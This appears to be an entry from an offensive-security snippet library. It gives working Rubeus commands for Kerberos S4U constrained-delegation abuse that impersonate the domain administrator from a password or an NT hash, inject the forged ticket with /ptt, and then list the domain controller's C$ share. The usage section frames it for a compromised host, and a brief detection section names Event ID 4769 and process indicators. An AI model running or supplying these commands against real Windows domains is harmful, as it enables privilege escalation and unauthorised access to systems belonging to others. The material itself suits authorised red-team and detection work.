---
id: c9c5858b-29e2-48b5-8a32-0f7e36d0f0fe
name: rubeus-s4u-with-password-or-hash
type: code
language: powershell
verified: true
created_at: '2023-04-06T03:56:07.695273+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
tags:
  - rubeus
  - s4u
validated: true
---

# rubeus-s4u-with-password-or-hash

## Code

```powershell
# with a password
Rubeus.exe s4u /nowrap /msdsspn:"time/target.local" /altservice:cifs /impersonateuser:"administrator" /domain:"domain" /user:"user" /password:"password"

# with a NT hash
Rubeus.exe s4u /user:user_for_delegation /rc4:user_pwd_hash /impersonateuser:user_to_impersonate /domain:domain.com /dc:dc01.domain.com /msdsspn:time/srv01.domain.com /altservice:cifs /ptt
Rubeus.exe s4u /user:MACHINE$ /rc4:MACHINE_PWD_HASH /impersonateuser:Administrator /msdsspn:"cifs/dc.domain.com" /altservice:cifs,http,host,rpcss,wsman,ldap /ptt
dir \\dc.domain.com\c$
```

## Description

PowerShell snippets for Rubeus S4U attacks using either password or NT hash, including follow-up access test.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| MSDSSP | Target SPN | time/target.local |
| ALTSERVICE | Services | cifs |
| IMPERSONATEUSER | User | administrator |
| DOMAIN | Domain | domain |
| USER | Delegator | user |
| PASSWORD | Plaintext password | password |
| RC4 | NT hash | user_pwd_hash |
| DC | DC hostname | dc01.domain.com |

## Usage

Run on compromised Windows host to generate impersonation tickets for delegation abuse. Use /ptt for immediate injection.

## Detection

- Rubeus.exe process spawning.
- Anomalous TGS requests in Event ID 4769.
- SMB access post-ticket injection.

## Related

- [[procedures/kerberos-constrained-delegation-exploitation]]
- [[tools/Rubeus]]
